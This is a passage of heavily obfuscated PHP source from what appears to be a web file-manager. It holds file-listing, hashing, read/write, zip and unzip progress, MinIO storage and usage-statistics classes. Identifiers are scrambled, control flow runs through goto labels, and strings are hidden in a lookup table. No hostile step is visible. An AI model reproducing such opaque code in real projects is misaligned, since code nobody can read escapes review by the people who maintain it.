$fá≠Âß‘åÉ[1280]) { continue; } $Bº†≠±¢åß = $b£Ü©ﬁåëÁ . $CÖàıÛ€¶†; if (is_file($Bº†≠±¢åß)) { $AÍÁ∫ºŒ≤°[$fá≠Âß‘åÉ[74]][] = $this->fileInfo($Bº†≠±¢åß, $CÇ—∆Âì‚•); } else { $AÍÁ∫ºŒ≤°[$fá≠Âß‘åÉ[75]][] = $this->folderInfo($Bº†≠±¢åß, $CÇ—∆Âì‚•); } } goto B‹Íäºäœé; bàÒæŒà’: } public function listAll($C∂è‡£‚µœ, &$dÃé¢œíÊ = array()) { goto bÀΩ©íπÛ†; eΩÕç–áí≤: return $dÃé¢œíÊ; goto aÇ™æ¢ıÀ◊; CπñÈÌ§§Ï: if (!($fç´ï¬∫ÿŸ = @opendir($C∂è‡£‚µœ))) { return $dÃé¢œíÊ; } while (($f≤√Ç§¯Ñõ = readdir($fç´ï¬∫ÿŸ)) !== !1) { if ($f≤√Ç§¯Ñõ == $EµÜ‡Ê¿¶¶[95] || $f≤√Ç§¯Ñõ == $EµÜ‡Ê¿¶¶[1280]) { continue; } $eÑŒ≥‡ü”† = $C∂è‡£‚µœ . $f≤√Ç§¯Ñõ; if (is_dir($eÑŒ≥‡ü”†) && !is_link($eÑŒ≥‡ü”†)) { $dÃé¢œíÊ[] = array($EµÜ‡Ê¿¶¶[76] => $eÑŒ≥‡ü”† . $EµÜ‡Ê¿¶¶[8], $EµÜ‡Ê¿¶¶[77] => 1, $EµÜ‡Ê¿¶¶[84] => @filemtime($eÑŒ≥‡ü”†), $EµÜ‡Ê¿¶¶[78] => 0); $this->listAll($eÑŒ≥‡ü”†, $dÃé¢œíÊ); } else { $dÃé¢œíÊ[] = array($EµÜ‡Ê¿¶¶[76] => $eÑŒ≥‡ü”†, $EµÜ‡Ê¿¶¶[77] => 0, $EµÜ‡Ê¿¶¶[84] => @filemtime($eÑŒ≥‡ü”†), $EµÜ‡Ê¿¶¶[78] => $this->size($eÑŒ≥‡ü”†)); } } closedir($fç´ï¬∫ÿŸ); goto eΩÕç–áí≤; bÀΩ©íπÛ†: $EµÜ‡Ê¿¶¶ =& $_SERVER[’ÿƒ†ïò]; $C∂è‡£‚µœ = $this->iconvSystem($C∂è‡£‚µœ); $C∂è‡£‚µœ = rtrim($C∂è‡£‚µœ, $EµÜ‡Ê¿¶¶[8]) . $EµÜ‡Ê¿¶¶[8]; goto CπñÈÌ§§Ï; aÇ™æ¢ıÀ◊: } public function has($e‹¿Æô†‘”, $eï√è„à©≤ = false, $eÉ≈úÎËªΩ = true) { goto a⁄¨≠≠àöÏ; b≠»…≤Üîê: if (!($AÊ€∂Ú§¨Ï = @opendir($e‹¿Æô†‘”))) { return !1; } $E∑ëøÍå∞˜ = 0; $A≥¥¬ç∑Üÿ = 0; goto fêçƒ£ÙŒ…; BπﬂòéŒ≈Â: if ($eï√è„à©≤) { return array($d˜Áä±πáÕ[203] => $E∑ëøÍå∞˜, $d˜Áä±πáÕ[204] => $A≥¥¬ç∑Üÿ); } return !1; goto aÌÖÌæÀˆ≥; fêçƒ£ÙŒ…: $Bå√òäúå‹ = 0; while (($Bﬂ√õ›Ï‹∏ = readdir($AÊ€∂Ú§¨Ï)) !== !1) { if ($Bﬂ√õ›Ï‹∏ == $d˜Áä±πáÕ[95] || $Bﬂ√õ›Ï‹∏ == $d˜Áä±πáÕ[1280]) { continue; } $aÒ≥À—¡Çæ = $e‹¿Æô†‘” . $Bﬂ√õ›Ï‹∏; if ($eï√è„à©≤) { $Bå√òäúå‹++; if (@is_file($aÒ≥À—¡Çæ)) { $E∑ëøÍå∞˜++; } else { $A≥¥¬ç∑Üÿ++; } if ($Bå√òäúå‹ > 10000) { break; } continue; } if ($eÉ≈úÎËªΩ) { if (@is_file($aÒ≥À—¡Çæ)) { return !0; } } else { if (@is_dir($aÒ≥À—¡Çæ . $d˜Áä±πáÕ[8])) { return !0; } } } closedir($AÊ€∂Ú§¨Ï); goto BπﬂòéŒ≈Â; a⁄¨≠≠àöÏ: $d˜Áä±πáÕ =& $_SERVER[’ÿƒ†ïò]; $e‹¿Æô†‘” = $this->iconvSystem($e‹¿Æô†‘”); $e‹¿Æô†‘” = rtrim($e‹¿Æô†‘”, $d˜Áä±πáÕ[8]) . $d˜Áä±πáÕ[8]; goto b≠»…≤Üîê; aÌÖÌæÀˆ≥: } public function hashSimple($fì⁄íÔŒÖ ) { goto a¿≠äƒïûΩ; dÕ…ÓØëÖ…: if ($fÒîÙÏ¥§é <= $cå“éÉÖ∑ * $A•ÀíÈÉ∆Î) { return $this->hashMd5($fì⁄íÔŒÖ ) . $fÒîÙÏ¥§é; } $D÷≠øøøÑ∂ = $e¥à±≈ﬁÂë[33]; $D•ñ∞°ç¡ = intval($fÒîÙÏ¥§é / $A•ÀíÈÉ∆Î); goto dÆÊ¬ú–ó∫; BäçÍéò™º: $fÒîÙÏ¥§é = $this->size($fì⁄íÔŒÖ ); $cå“éÉÖ∑ = 200; $A•ÀíÈÉ∆Î = 50; goto dÕ…ÓØëÖ…; FÇò‘ç¡∑ù: fseek_64($b÷•‘ÃÚ≠·, $fÒîÙÏ¥§é - $cå“éÉÖ∑); $D÷≠øøøÑ∂ .= fread($b÷•‘ÃÚ≠·, $cå“éÉÖ∑); fclose($b÷•‘ÃÚ≠·); goto dÉ—ÙÁ˘ë•; a¿≠äƒïûΩ: $e¥à±≈ﬁÂë =& $_SERVER[’ÿƒ†ïò]; if (!$fì⁄íÔŒÖ ) { return md5($e¥à±≈ﬁÂë[33]); } $fì⁄íÔŒÖ  = $this->iconvSystem($fì⁄íÔŒÖ ); goto BäçÍéò™º; dÉ—ÙÁ˘ë•: return md5($D÷≠øøøÑ∂) . $fÒîÙÏ¥§é; goto añ‘Ï®ò˘É; dÆÊ¬ú–ó∫: $b÷•‘ÃÚ≠· = fopen($fì⁄íÔŒÖ , $e¥à±≈ﬁÂë[1287]); if (!$b÷•‘ÃÚ≠·) { return $D÷≠øøøÑ∂; } for ($BŸÈá‹â—÷ = 0; $BŸÈá‹â—÷ < $A•ÀíÈÉ∆Î; $BŸÈá‹â—÷++) { fseek_64($b÷•‘ÃÚ≠·, $D•ñ∞°ç¡ * $BŸÈá‹â—÷); $D÷≠øøøÑ∂ .= fread($b÷•‘ÃÚ≠·, $cå“éÉÖ∑); } goto FÇò‘ç¡∑ù; añ‘Ï®ò˘É: } public function getContent($bá®®ãØÈã) { $bá®®ãØÈã = $this->iconvSystem($bá®®ãØÈã); return file_get_contents($bá®®ãØÈã); } public function setContent($Aı Ø†Á™Õ, $DÖÑπÜÖü‚ = '') { $Aı Ø†Á™Õ = $this->iconvSystem($Aı Ø†Á™Õ); $fÑâîÇêÌ  = @file_put_contents($Aı Ø†Á™Õ, $DÖÑπÜÖü‚, LOCK_EX); clearstatcache(); @chmod($Aı Ø†Á™Õ, $this->pathAuth); return $fÑâîÇêÌ  === !1 ? !1 : !0; } public function fileSubstr($C• ‘ªÎé≈, $d‰ì”ç›ÁÉ = 0, $D…¿ôÒ≈•Ú = false) { goto f¥’á∑Âô; Bç‘ÀÑ…‚œ: return $E≤›ÊÕ¶Ï‡; goto bˆ˘¿∑Âÿ≥; f¥’á∑Âô: $A®äıìÀãÇ =& $_SERVER[’ÿƒ†ïò]; $C• ‘ªÎé≈ = $this->iconvSystem($C• ‘ªÎé≈); if ($D…¿ôÒ≈•Ú === !1) { $D…¿ôÒ≈•Ú = $this->size($C• ‘ªÎé≈); } goto eÑÆπ∂ÿæú; D∆¯⁄»º™È: fseek_64($aùØé›ÿã‚, $d‰ì”ç›ÁÉ); $E≤›ÊÕ¶Ï‡ = fread($aùØé›ÿã‚, $D…¿ôÒ≈•Ú); fclose($aùØé›ÿã‚); goto Bç‘ÀÑ…‚œ; eÑÆπ∂ÿæú: if ($D…¿ôÒ≈•Ú <= 0) { return $A®äıìÀãÇ[33]; } $aùØé›ÿã‚ = fopen($C• ‘ªÎé≈, $A®äıìÀãÇ[1287]); if (!$aùØé›ÿã‚) { return !1; } goto D∆¯⁄»º™È; bˆ˘¿∑Âÿ≥: } public function upload($B∏¢∞’≥Ã¨, $DØüÃæçÚ, $fÎÖæ∞µú” = false, $Aﬁ¥Ω„Ëô‰ = REPEAT_REPLACE) { if ($fÎÖæ∞µú”) { return $this->moveFile($DØüÃæçÚ, $B∏¢∞’≥Ã¨); } return $this->copyFile($DØüÃæçÚ, $B∏¢∞’≥Ã¨); } public function setModifyTime($DòÊéÜïÈ˜, $BÒ™≥¿ÚÂÔ = '') { @touch($DòÊéÜïÈ˜, intval($BÒ™≥¿ÚÂÔ)); } public function download($aÙÊ¶ê˘ï“, $fÉ≤™œŸÙ) { return $this->iconvSystem($aÙÊ¶ê˘ï“); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($d€ƒ≥ó»ﬂé) { parent::__construct($d€ƒ≥ó»ﬂé); $this->signatureVersion($_SERVER[’ÿƒ†ïò][212]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto d´Ó˘ß…ò«; Aë≈˘ÍÛêΩ: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto D´⁄ë£æàÈ; D´⁄ë£æàÈ: $Dúµ ªÚŸ  =& $_SERVER[’ÿƒ†ïò]; parent::startAfter(); Hook::bind($Dúµ ªÚŸ [1644], array($this, $Dúµ ªÚŸ [1645])); goto Cáô‡é◊Í‰; Cáô‡é◊Í‰: Hook::bind($Dúµ ªÚŸ [1117], array($this, $Dúµ ªÚŸ [1646])); $D±√À∏îØ˜ =& $this->task; $D±√À∏îØ˜[$Dúµ ªÚŸ [1647]] = $Dúµ ªÚŸ [1122]; goto a’Ÿ∆›©´°; a’Ÿ∆›©´°: if (!$D±√À∏îØ˜[$Dúµ ªÚŸ [1460]]) { $D±√À∏îØ˜[$Dúµ ªÚŸ [1460]] = LNG($Dúµ ªÚŸ [1648]); } goto AùêÕæùüº; AùêÕæùüº: } protected function endAfter() { $b∫Ô£µéÖË =& $_SERVER[’ÿƒ†ïò]; parent::endAfter(); Hook::unbind($b∫Ô£µéÖË[1644], array($this, $b∫Ô£µéÖË[1645])); Hook::unbind($b∫Ô£µéÖË[1117], array($this, $b∫Ô£µéÖË[1646])); } public function updateAfter() { $F§ıíÿË£ç =& $_SERVER[’ÿƒ†ïò]; $cŸ·É‡∆óÃ =& $this->task; if (!$cŸ·É‡∆óÃ[$F§ıíÿË£ç[1050]] || !$cŸ·É‡∆óÃ[$F§ıíÿË£ç[751]]) { return; } if ($cŸ·É‡∆óÃ[$F§ıíÿË£ç[1647]] == $F§ıíÿË£ç[1122]) { $B◊‰úêŸÈï = 0; if ($cŸ·É‡∆óÃ[$F§ıíÿË£ç[1603]]) { $B◊‰úêŸÈï = $cŸ·É‡∆óÃ[$F§ıíÿË£ç[1604]] / $cŸ·É‡∆óÃ[$F§ıíÿË£ç[1603]]; } $cŸ·É‡∆óÃ[$F§ıíÿË£ç[1558]] = $B◊‰úêŸÈï * 0.3; } else { if ($cŸ·É‡∆óÃ[$F§ıíÿË£ç[1647]] == $F§ıíÿË£ç[311]) { $B◊‰úêŸÈï = $cŸ·É‡∆óÃ[$F§ıíÿË£ç[1064]] / $cŸ·É‡∆óÃ[$F§ıíÿË£ç[1050]]; $cŸ·É‡∆óÃ[$F§ıíÿË£ç[1558]] = 0.3 + $B◊‰úêŸÈï * 0.4; } else { if ($cŸ·É‡∆óÃ[$F§ıíÿË£ç[1647]] == $F§ıíÿË£ç[107]) { $aÍ‘õÑ‡–Ø = 0; if ($cŸ·É‡∆óÃ[$F§ıíÿË£ç[1605]] == $F§ıíÿË£ç[107]) { $aÍ‘õÑ‡–Ø = $cŸ·É‡∆óÃ[$F§ıíÿË£ç[1604]]; } $B◊‰úêŸÈï = ($cŸ·É‡∆óÃ[$F§ıíÿË£ç[1608]] + $aÍ‘õÑ‡–Ø) / $cŸ·É‡∆óÃ[$F§ıíÿË£ç[751]]; $cŸ·É‡∆óÃ[$F§ıíÿË£ç[1558]] = 0.3 + 0.4 + $B◊‰úêŸÈï * 0.3; } } } if ($cŸ·É‡∆óÃ[$F§ıíÿË£ç[1558]] > 0) { $cÏø›œÖ›∂ = timeFloat() - $cŸ·É‡∆óÃ[$F§ıíÿË£ç[777]] - $cŸ·É‡∆óÃ[$F§ıíÿË£ç[1561]]; $cŸ·É‡∆óÃ[$F§ıíÿË£ç[1562]] = $cÏø›œÖ›∂ * (1 - $cŸ·É‡∆óÃ[$F§ıíÿË£ç[1558]]) / $cŸ·É‡∆óÃ[$F§ıíÿË£ç[1558]]; } } public function addFile($eØæÛ∏Ë¯‘) { goto E…ùñÿúâ≤; cªˆí∞è‡£: $A¡¶§◊–ú’[$bı·£¨”Ì´[1050]] = 1; $d—Ö€≠’—± = 0; $A¡¶§◊–ú’[$bı·£¨”Ì´[1612]] = array($bı·£¨”Ì´[1613] => $d—Ö€≠’—± + 1, $bı·£¨”Ì´[415] => $f˘ï—êå±Ã[$bı·£¨”Ì´[28]], $bı·£¨”Ì´[76] => $f˘ï—êå±Ã[$bı·£¨”Ì´[76]], $bı·£¨”Ì´[513] => $f˘ï—êå±Ã[$bı·£¨”Ì´[513]] ? $f˘ï—êå±Ã[$bı·£¨”Ì´[513]] : $f˘ï—êå±Ã[$bı·£¨”Ì´[76]]); goto C∫≥¡˘“Ñì; C∫≥¡˘“Ñì: $this->update(); goto D‰”„∫ûÉ˜; B’ä•¬ßÈ£: $A¡¶§◊–ú’[$bı·£¨”Ì´[1052]] = $bı·£¨”Ì´[1623]; $A¡¶§◊–ú’[$bı·£¨”Ì´[1605]] = $bı·£¨”Ì´[1122]; $A¡¶§◊–ú’[$bı·£¨”Ì´[751]] = $f˘ï—êå±Ã[$bı·£¨”Ì´[78]]; goto cªˆí∞è‡£; Cπ⁄¨ÒΩéø: $A¡¶§◊–ú’[$bı·£¨”Ì´[1601]] = $f˘ï—êå±Ã[$bı·£¨”Ì´[28]]; $A¡¶§◊–ú’[$bı·£¨”Ì´[1603]] = $f˘ï—êå±Ã[$bı·£¨”Ì´[78]]; $A¡¶§◊–ú’[$bı·£¨”Ì´[1604]] = 0; goto B’ä•¬ßÈ£; E…ùñÿúâ≤: $bı·£¨”Ì´ =& $_SERVER[’ÿƒ†ïò]; $A¡¶§◊–ú’ =& $this->task; $f˘ï—êå±Ã = IO::info($eØæÛ∏Ë¯‘); goto Cπ⁄¨ÒΩéø; D‰”„∫ûÉ˜: } public function unzipAfter($E∞ÃñœŒÛ‘) { goto eóô‡âÔ¥ß; b¢∑˘áø™‘: $DÀÔƒ®ìÁ·[$dﬂåô’π◊Ω[1601]] = $dﬂåô’π◊Ω[33]; $DÀÔƒ®ìÁ·[$dﬂåô’π◊Ω[1608]] = 0; $DÀÔƒ®ìÁ·[$dﬂåô’π◊Ω[751]] = $c∆•ÖåçΩ⁄[$dﬂåô’π◊Ω[78]]; goto aâÈüù±∞Ü; aæ∫∞ì¶‚ö: $DÀÔƒ®ìÁ·[$dﬂåô’π◊Ω[1064]] = 0; $DÀÔƒ®ìÁ·[$dﬂåô’π◊Ω[1603]] = 0; $DÀÔƒ®ìÁ·[$dﬂåô’π◊Ω[1604]] = 0; goto b¢∑˘áø™‘; aâÈüù±∞Ü: $this->update(); self::log($dﬂåô’π◊Ω[1649] . json_encode(array($DÀÔƒ®ìÁ·, $c∆•ÖåçΩ⁄))); goto CÆéù‹ø∞ª; bÈçÑà”£ˆ: if ($c∆•ÖåçΩ⁄[$dﬂåô’π◊Ω[29]] == $dﬂåô’π◊Ω[193]) { $DÀÔƒ®ìÁ·[$dﬂåô’π◊Ω[1050]] = 1; } else { $DÀÔƒ®ìÁ·[$dﬂåô’π◊Ω[1050]] = $c∆•ÖåçΩ⁄[$dﬂåô’π◊Ω[81]][$dﬂåô’π◊Ω[79]]; } $DÀÔƒ®ìÁ·[$dﬂåô’π◊Ω[1052]] = $dﬂåô’π◊Ω[33]; $DÀÔƒ®ìÁ·[$dﬂåô’π◊Ω[1605]] = 0; goto aæ∫∞ì¶‚ö; bàıã¬úõâ: $c∆•ÖåçΩ⁄ = IO::infoWithChildren($E∞ÃñœŒÛ‘); $f´‹æﬂÿñ¢ = 0; $DÀÔƒ®ìÁ·[$dﬂåô’π◊Ω[1612]] = array($dﬂåô’π◊Ω[1613] => $f´‹æﬂÿñ¢ + 1, $dﬂåô’π◊Ω[415] => $c∆•ÖåçΩ⁄[$dﬂåô’π◊Ω[28]], $dﬂåô’π◊Ω[76] => $c∆•ÖåçΩ⁄[$dﬂåô’π◊Ω[76]], $dﬂåô’π◊Ω[513] => $c∆•ÖåçΩ⁄[$dﬂåô’π◊Ω[513]] ? $c∆•ÖåçΩ⁄[$dﬂåô’π◊Ω[513]] : $c∆•ÖåçΩ⁄[$dﬂåô’π◊Ω[76]]); goto bÈçÑà”£ˆ; eóô‡âÔ¥ß: $dﬂåô’π◊Ω =& $_SERVER[’ÿƒ†ïò]; $DÀÔƒ®ìÁ· =& $this->task; $DÀÔƒ®ìÁ·[$dﬂåô’π◊Ω[1647]] = $dﬂåô’π◊Ω[107]; goto bàıã¬úõâ; CÆéù‹ø∞ª: } public function nameParse($BÇﬂÆ—•Ú⁄) { goto bèÛß…˘—∑; D˜ÃÊû—∏µ: $a÷Œÿˆöëπ = get_path_this($BÇﬂÆ—•Ú⁄); if (strstr($a÷Œÿˆöëπ, $b°ú¿Ö—™◊[95])) { $B—õ–ﬂ√ÆÒ[$b°ú¿Ö—™◊[1064]] += 1; $B—õ–ﬂ√ÆÒ[$b°ú¿Ö—™◊[1050]] += 1; } $B—õ–ﬂ√ÆÒ[$b°ú¿Ö—™◊[1601]] = $BÇﬂÆ—•Ú⁄; goto Eﬂ≠ßΩ‘èº; bèÛß…˘—∑: $b°ú¿Ö—™◊ =& $_SERVER[’ÿƒ†ïò]; $B—õ–ﬂ√ÆÒ =& $this->task; if ($B—õ–ﬂ√ÆÒ[$b°ú¿Ö—™◊[1647]] == $b°ú¿Ö—™◊[1122]) { $B—õ–ﬂ√ÆÒ[$b°ú¿Ö—™◊[1647]] = $b°ú¿Ö—™◊[311]; $B—õ–ﬂ√ÆÒ[$b°ú¿Ö—™◊[1608]] = 0; $B—õ–ﬂ√ÆÒ[$b°ú¿Ö—™◊[751]] = 0; } goto D˜ÃÊû—∏µ; Eﬂ≠ßΩ‘èº: $this->update(); goto B¶µòùê§Ÿ; B¶µòùê§Ÿ: } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $a´´Ωó°ùª =& $_SERVER[’ÿƒ†ïò]; parent::startAfter(); Hook::bind($a´´Ωó°ùª[1650], array($this, $a´´Ωó°ùª[1645])); $Fô®¢ü˘¡¶ =& $this->task; $Fô®¢ü˘¡¶[$a´´Ωó°ùª[1647]] = $a´´Ωó°ùª[1122]; if (!$Fô®¢ü˘¡¶[$a´´Ωó°ùª[1460]]) { $Fô®¢ü˘¡¶[$a´´Ωó°ùª[1460]] = LNG($a´´Ωó°ùª[1651]); } } protected function endAfter() { $F÷åÛÏƒ›Ç =& $_SERVER[’ÿƒ†ïò]; parent::endAfter(); Hook::unbind($F÷åÛÏƒ›Ç[1650], array($this, $F÷åÛÏƒ›Ç[1645])); } public function updateAfter() { $bëá´í–Ωú =& $_SERVER[’ÿƒ†ïò]; $aõè•àÇƒŒ =& $this->task; if (!$aõè•àÇƒŒ[$bëá´í–Ωú[1050]] || !$aõè•àÇƒŒ[$bëá´í–Ωú[751]]) { return; } if ($aõè•àÇƒŒ[$bëá´í–Ωú[1647]] == $bëá´í–Ωú[1122]) { $a≤°ôêË∫† = $aõè•àÇƒŒ[$bëá´í–Ωú[1604]]; if ($aõè•àÇƒŒ[$bëá´í–Ωú[1605]] != $bëá´í–Ωú[1122]) { $a≤°ôêË∫† = 0; } $AøÆ„Á≤ú∏ = ($aõè•àÇƒŒ[$bëá´í–Ωú[1608]] + $a≤°ôêË∫†) / $aõè•àÇƒŒ[$bëá´í–Ωú[751]]; $aõè•àÇƒŒ[$bëá´í–Ωú[1558]] = $AøÆ„Á≤ú∏ * 0.3; } else { if ($aõè•àÇƒŒ[$bëá´í–Ωú[1647]] == $bëá´í–Ωú[311]) { $AøÆ„Á≤ú∏ = $aõè•àÇƒŒ[$bëá´í–Ωú[1064]] / $aõè•àÇƒŒ[$bëá´í–Ωú[1050]]; $aõè•àÇƒŒ[$bëá´í–Ωú[1558]] = 0.3 + $AøÆ„Á≤ú∏ * 0.5; } else { if ($aõè•àÇƒŒ[$bëá´í–Ωú[1647]] == $bëá´í–Ωú[107]) { $AøÆ„Á≤ú∏ = 0; if ($aõè•àÇƒŒ[$bëá´í–Ωú[1603]]) { $AøÆ„Á≤ú∏ = $aõè•àÇƒŒ[$bëá´í–Ωú[1604]] / $aõè•àÇƒŒ[$bëá´í–Ωú[1603]]; } $aõè•àÇƒŒ[$bëá´í–Ωú[1558]] = 0.3 + 0.5 + $AøÆ„Á≤ú∏ * 0.2; } } } if ($aõè•àÇƒŒ[$bëá´í–Ωú[1558]] > 0) { $Fìœ√Ë»Öë = timeFloat() - $aõè•àÇƒŒ[$bëá´í–Ωú[777]] - $aõè•àÇƒŒ[$bëá´í–Ωú[1561]]; $aõè•àÇƒŒ[$bëá´í–Ωú[1562]] = $Fìœ√Ë»Öë * (1 - $aõè•àÇƒŒ[$bëá´í–Ωú[1558]]) / $aõè•àÇƒŒ[$bëá´í–Ωú[1558]]; } } public function copyFileStart($cÏá≈ÊõÁÖ, $b¶±ªœÕƒÃ, $d⁄Æ›∫ä∫é, $b•≥•Ñ¶‘¯, $Aœ±Ñ≥ÕñØ, $eî‘ÇﬁéÖá) { $EåûÑ¿üî® =& $_SERVER[’ÿƒ†ïò]; parent::copyFileStart($cÏá≈ÊõÁÖ, $b¶±ªœÕƒÃ, $d⁄Æ›∫ä∫é, $b•≥•Ñ¶‘¯, $Aœ±Ñ≥ÕñØ, $eî‘ÇﬁéÖá); $cπù“«ﬂµë =& $this->task; if ($cπù“«ﬂµë[$EåûÑ¿üî®[1647]] == $EåûÑ¿üî®[311]) { $cπù“«ﬂµë[$EåûÑ¿üî®[1647]] = $EåûÑ¿üî®[107]; } $this->update(); } public function copyFileEnd($C·∆ƒú∂Öó, $aãÇ˘∞ŸÚ, $A≥ƒ◊çÊÜò, $C“ƒ”«Ã∫ , $còƒ≠ﬁôæÔ, $E±›∫Ñ¢Êã) { $f≥÷œ§≈«÷ =& $_SERVER[’ÿƒ†ïò]; $Aﬁ©ÍãÎ∆Ÿ =& $this->task; $Aﬁ©ÍãÎ∆Ÿ[$f≥÷œ§≈«÷[1604]] = $Aﬁ©ÍãÎ∆Ÿ[$f≥÷œ§≈«÷[1603]]; $Aﬁ©ÍãÎ∆Ÿ[$f≥÷œ§≈«÷[1608]] += $Aﬁ©ÍãÎ∆Ÿ[$f≥÷œ§≈«÷[1603]]; $Aﬁ©ÍãÎ∆Ÿ[$f≥÷œ§≈«÷[1605]] = $f≥÷œ§≈«÷[33]; $this->update(); } public function nameParse($BÑÂÿÏéÀ‚) { $FîºÌ√îﬂñ =& $_SERVER[’ÿƒ†ïò]; $a‡‘Úãöä≠ =& $this->task; if ($a‡‘Úãöä≠[$FîºÌ√îﬂñ[1064]] < $a‡‘Úãöä≠[$FîºÌ√îﬂñ[1050]]) { $Cá•ƒ±·òò = get_path_this($BÑÂÿÏéÀ‚); if (strstr($Cá•ƒ±·òò, $FîºÌ√îﬂñ[95])) { $a‡‘Úãöä≠[$FîºÌ√îﬂñ[1064]] += 1; } } if ($a‡‘Úãöä≠[$FîºÌ√îﬂñ[1647]] == $FîºÌ√îﬂñ[1122]) { $a‡‘Úãöä≠[$FîºÌ√îﬂñ[1647]] = $FîºÌ√îﬂñ[311]; } $a‡‘Úãöä≠[$FîºÌ√îﬂñ[1601]] = $BÑÂÿÏéÀ‚; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($bπ∂º±ÿÁ ) { $BÜÑı±ÈÖı =& $_SERVER[’ÿƒ†ïò]; $aÇ∆·¬ƒÃØ = array($BÜÑı±ÈÖı[588] => array($BÜÑı±ÈÖı[29] => $BÜÑı±ÈÖı[1652], $BÜÑı±ÈÖı[271] => array($BÜÑı±ÈÖı[222], $BÜÑı±ÈÖı[753], $BÜÑı±ÈÖı[1653], $BÜÑı±ÈÖı[1654])), $BÜÑı±ÈÖı[1655] => array($BÜÑı±ÈÖı[29] => $BÜÑı±ÈÖı[1656], $BÜÑı±ÈÖı[271] => array($BÜÑı±ÈÖı[222], $BÜÑı±ÈÖı[751], $BÜÑı±ÈÖı[1657], $BÜÑı±ÈÖı[1658], $BÜÑı±ÈÖı[1659]))); if (!isset($aÇ∆·¬ƒÃØ[$bπ∂º±ÿÁ ])) { return !1; } $this->optionType = $aÇ∆·¬ƒÃØ[$bπ∂º±ÿÁ ][$BÜÑı±ÈÖı[29]]; $this->field = $aÇ∆·¬ƒÃØ[$bπ∂º±ÿÁ ][$BÜÑı±ÈÖı[271]]; return !0; } public function listData($Fá…îîïá€ = false, $e±ßﬁèÏø´ = "\x6d\x6f\144\151\x66\x79\x54\x69\155\x65", $cª£°áŒ°Œ = false) { return parent::listData($Fá…îîïá€, $e±ßﬁèÏø´, $cª£°áŒ°Œ); } public function trendList($e‚»ËîÀºÙ) { goto D–ÿÆàäÇñ; D–ÿÆàäÇñ: $AÏ∑∑Œ®ßÈ =& $_SERVER[’ÿƒ†ïò]; $FÇ‡êÉ∂á‡ = $this->listData(); if ($FÇ‡êÉ∂á‡) { $fÕÎ—°®Âë = end($FÇ‡êÉ∂á‡); $B≠°∑™—ŸÀ = date($AÏ∑∑Œ®ßÈ[1660], strtotime($AÏ∑∑Œ®ßÈ[1661])); if ($fÕÎ—°®Âë[$AÏ∑∑Œ®ßÈ[222]] == $B≠°∑™—ŸÀ) { return $FÇ‡êÉ∂á‡; } $DªÊ„˜·Œ‰ = strtotime($fÕÎ—°®Âë[$AÏ∑∑Œ®ßÈ[222]]); } goto DËÊ≤äÏ™ë; fü¯¿ÖÖ∞: foreach ($Fæ‚êü”í™ as $B≠°∑™—ŸÀ) { $this->{$AÈÜªÀîÏœ}($B≠°∑™—ŸÀ); } return $this->listData(); goto EÀõ¢√†ÿü; DËÊ≤äÏ™ë: if (!isset($DªÊ„˜·Œ‰)) { $Cﬂ¶ÑÀƒﬂ¶ = $e‚»ËîÀºÙ == $AÏ∑∑Œ®ßÈ[588] ? $AÏ∑∑Œ®ßÈ[532] : $AÏ∑∑Œ®ßÈ[820]; $DªÊ„˜·Œ‰ = Model($Cﬂ¶ÑÀƒﬂ¶)->min($AÏ∑∑Œ®ßÈ[194]); } $AÈÜªÀîÏœ = $AÏ∑∑Œ®ßÈ[1662] . ucfirst($e‚»ËîÀºÙ); $Fæ‚êü”í™ = $this->dateList($DªÊ„˜·Œ‰); goto fü¯¿ÖÖ∞; EÀõ¢√†ÿü: } private function dateList($dé™öÀ≈ë¯) { $A’èÿú¥É’ =& $_SERVER[’ÿƒ†ïò]; $c¡ÓÈâπ”í = $dé™öÀ≈ë¯; $B›®¨ò‘˜É = strtotime($A’èÿú¥É’[1661]); $Aã¯ñ∂ÊÍÀ = array(); while ($c¡ÓÈâπ”í <= $B›®¨ò‘˜É) { $Aã¯ñ∂ÊÍÀ[] = date($A’èÿú¥É’[1660], $c¡ÓÈâπ”í); $c¡ÓÈâπ”í = strtotime($A’èÿú¥É’[1663], $c¡ÓÈâπ”í); } return $Aã¯ñ∂ÊÍÀ; } public function _recordUser($D„ú‚õÆìÒ = '') { goto dé…“öâ®∏; dé…“öâ®∏: $d’”§ﬂ…êª =& $_SERVER[’ÿƒ†ïò]; $Bÿòı§¨åã = strtotime(date($d’”§ﬂ…êª[1664], strtotime($D„ú‚õÆìÒ))); $a⁄ÑÖóîœË = strtotime(date($d’”§ﬂ…êª[1665], strtotime($D„ú‚õÆìÒ))); goto EÓàƒŸÙÙ»; c≤°„âå ó: $aöÙ⁄à≠ΩÓ = Model($d’”§ﬂ…êª[532])->where($FÖß§à˘ºô)->count($d’”§ﬂ…êª[1557]); $FÖß§à˘ºô[$d’”§ﬂ…êª[29]] = $d’”§ﬂ…êª[1666]; $d§≤∞ú£≥î = Model($d’”§ﬂ…êª[1667])->where($FÖß§à˘ºô)->count($d’”§ﬂ…êª[1668]); goto bßÙ‚√ı˜„; EÓàƒŸÙÙ»: $FÖß§à˘ºô = array($d’”§ﬂ…êª[194] => array($d’”§ﬂ…êª[1000], $a⁄ÑÖóîœË)); $e”≤«Ø≥·Ç = Model($d’”§ﬂ…êª[532])->where($FÖß§à˘ºô)->count($d’”§ﬂ…êª[1557]); $FÖß§à˘ºô[$d’”§ﬂ…êª[194]] = array($d’”§ﬂ…êª[331], array($Bÿòı§¨åã, $a⁄ÑÖóîœË)); goto c≤°„âå ó; bßÙ‚√ı˜„: $b›‰·Ôë¡ó = array($d’”§ﬂ…êª[222] => $D„ú‚õÆìÒ, $d’”§ﬂ…êª[753] => (int) $e”≤«Ø≥·Ç, $d’”§ﬂ…êª[1653] => (int) $aöÙ⁄à≠ΩÓ, $d’”§ﬂ…êª[1654] => (int) $d§≤∞ú£≥î); return $this->insert($b›‰·Ôë¡ó); goto DÕêÒõ¢Ù»; DÕêÒõ¢Ù»: } public function _recordStore($dõ‰´ÒËÃ… = '') { goto e°‹˜åÀ‚«; e°‹˜åÀ‚«: $EÊÌŒëç•Ñ =& $_SERVER[’ÿƒ†ïò]; $aΩÁ¶ΩÖòΩ = strtotime(date($EÊÌŒëç•Ñ[1665], strtotime($dõ‰´ÒËÃ…))); $B ∂äËàÉΩ = array($EÊÌŒëç•Ñ[194] => array($EÊÌŒëç•Ñ[1000], 